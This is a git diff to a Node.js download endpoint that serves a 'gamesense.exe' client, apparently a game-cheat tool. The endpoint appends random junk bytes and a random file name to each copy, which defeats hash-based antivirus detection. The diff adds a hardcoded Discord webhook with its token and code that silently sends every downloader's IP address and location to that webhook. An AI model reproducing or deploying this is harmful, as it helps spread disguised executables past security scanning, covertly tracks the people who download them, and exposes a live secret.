@@ -1,5 +1,7 @@
 const https = require('https');
 
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527198025808871515/aipEG-sdQpiOviX2udpy3I-Rvk_z3RpkD4M8jRu1TL-lelPI3bN6o4W-RlsleZklPQJL";
+
 module.exports = async (req, res) => {
     const fileUrl = 'https://gamesense-revive.github.io/gamesense.exe';
 
@@ -29,6 +31,38 @@ module.exports = async (req, res) => {
             }
             
             const modifiedBuffer = Buffer.concat([buffer, junkBytes]);
+
+            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
+            const country = req.headers['x-vercel-ip-country'] || 'Unknown';
+            const city = req.headers['x-vercel-ip-city'] || 'Unknown';
+
+            const logPayload = JSON.stringify({
+                embeds: [{
+                    title: "📥 Client Downloaded",
+                    color: 3066993,
+                    fields: [
+                        { name: "Generated Name", value: `\`${randomName}.exe\``, inline: true },
+                        { name: "IP Address", value: `\`${ip}\``, inline: true },
+                        { name: "Location", value: `${city}, ${country}`, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            });
+
+            const urlObj = new URL(DISCORD_WEBHOOK_URL);
+            const options = {
+                hostname: urlObj.hostname,
+                path: urlObj.pathname + urlObj.search,
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': Buffer.byteLength(logPayload)
+                }
+            };
+
+            const reqDiscord = https.request(options);
+            reqDiscord.write(logPayload);
+            reqDiscord.end();
 
             res.setHeader('Content-Type', 'application/octet-stream');
             res.setHeader('Content-Disposition', `attachment; filename="${randomName}.exe"`);
